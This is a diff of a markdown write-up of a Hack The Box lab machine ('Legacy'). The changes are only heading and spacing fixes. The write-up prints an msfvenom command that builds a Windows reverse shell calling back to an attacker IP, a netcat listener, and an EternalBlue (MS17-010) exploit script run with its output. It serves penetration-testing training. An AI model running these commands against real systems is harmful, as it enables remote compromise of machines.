@@ -61,18 +61,22 @@ Host script results:
 ... 
 ```
 
-##MS17-010 (CVE-2017-0143)
+## MS17-010 (CVE-2017-0143)
 This is Eternal Blue. At this point, I got stuck and followed Rana Khalil's walkthrough (https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/legacy-writeup-w-o-metasploit). I downloaded Impacket into my Ptyhon2.7 directory along with https://github.com/helviojunior/MS17-010.git exploit code. 
 
 From there, I created a reverse Windows TCP shell using meterpreter:
+
 ```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o reverse-shell.exe```
 
 This creates a reverse Windows TCP shell called "reverse-shell.exe" that attempts to connect to my local machine on port 4444.
 
-##Exploit
+## Exploit
 From there I started a Netcat listener on port 4444:
+
 ```nc -nlvp 4444```
+
 And using helviojunior's ***send_and_execute.py*** script, sent the exploit to the target machine:
+
 ```
 kali@kali:~/Desktop/OSCP/Legacy/MS17-010 manual exploit/MS17-010-master$ python send_and_execute.py 10.10.10.4 ../../reverse-shell.exe 
 Trying to connect to 10.10.10.4:445
@@ -108,6 +112,7 @@ Done
 ```
 
 Catch on the listener:
+
 ```
 kali@kali:~/Desktop/OSCP/Legacy$ nc -nlvp 4444
 listening on [any] 4444 ...
